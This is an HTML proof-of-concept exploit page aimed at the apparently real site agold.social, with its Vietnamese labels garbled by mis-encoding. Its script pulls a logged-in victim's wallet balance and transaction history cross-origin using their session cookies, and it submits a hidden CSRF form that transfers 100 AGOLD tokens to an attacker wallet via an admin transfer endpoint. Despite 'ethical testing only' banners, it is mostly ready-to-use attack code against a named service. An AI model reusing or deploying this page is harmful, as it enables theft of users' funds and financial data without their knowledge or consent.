<!DOCTYPE html>
<html>
<head>
  <title>Agold.social - CORS & CSRF Exploit PoC</title>
  <style>
    body { font-family: Arial; text-align: center; margin: 50px; }
    button { padding: 10px 20px; margin: 10px; background: #d32f2f; color: white; border: none; cursor: pointer; }
    button:hover { background: #b71c1c; }
    pre { background: #f4f4f4; padding: 15px; border-radius: 8px; text-align: left; display: inline-block; max-width: 80%; }
    h1 { color: #d32f2f; }
    .warning { color: red; font-weight: bold; }
  </style>
</head>
<body>
  <h1 class="warning">Agold.social Exploit Demo (Ethical Testing ONLY)</h1>
  <p><small>ƒêƒÉng nh·∫≠p <code>agold.social</code> ·ªü tab kh√°c tr∆∞·ªõc khi test!</small></p>

  <!-- CORS Tests -->
  <h2>1. Test CORS (Leak Data)</h2>
  <button onclick="testCORS('/user/wallet')">Test Wallet Balance</button>
  <button onclick="testCORS('/user/wallet/transaction-history')">Test Transaction History</button>
  <pre id="corsResult">Click ƒë·ªÉ test...</pre>

  <!-- CSRF Tests -->
  <h2>2. Test CSRF (Transfer Token)</h2>
  <p class="warning">N√∫t d∆∞·ªõi s·∫Ω chuy·ªÉn 100 AGOLD ƒë·∫øn hacker_wallet n·∫øu vuln!</p>
  <button onclick="testCSRF()">EXPLOIT: Chuy·ªÉn 100 AGOLD</button>

  <script>
    // CORS Test Function
    async function testCORS(endpoint) {
      const url = `https://gateway.agold.social${endpoint}`;
      const resultEl = document.getElementById('corsResult');
      resultEl.textContent = `Testing ${url}...\n`;

      try {
        const res = await fetch(url, {
          method: 'GET',
          credentials: 'include'  // G·ª≠i cookie session
        });
        resultEl.textContent += `Status: ${res.status}\n`;
        resultEl.textContent += `CORS Headers: ${JSON.stringify([...res.headers.entries()])}`;

        if (res.ok) {
          const data = await res.json();
          resultEl.textContent += `\nSUCCESS! Data Leaked:\n${JSON.stringify(data, null, 2)}`;
          alert('üö® CORS VULN! D·ªØ li·ªáu b·ªã leak!');
        }
      } catch (err) {
        resultEl.textContent += `Error: ${err.message}\n(CORS Blocked - An to√†n!)`;
      }
    }

    // CSRF Test Function
    function testCSRF() {
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'https://gateway.agold.social/admin/wallet/transfer';
      form.innerHTML = `
        <input type="hidden" name="to" value="hacker_wallet_123">
        <input type="hidden" name="amount" value="100">
        <input type="hidden" name="token" value="AGOLD">
      `;
      document.body.appendChild(form);
      form.submit();
      alert('CSRF Triggered! Check v√≠ agold.social...');
    }
  </script>

  <hr>
  <p class="warning">Ethical only! Report vuln to agold.social if found.</p>
</body>
</html>
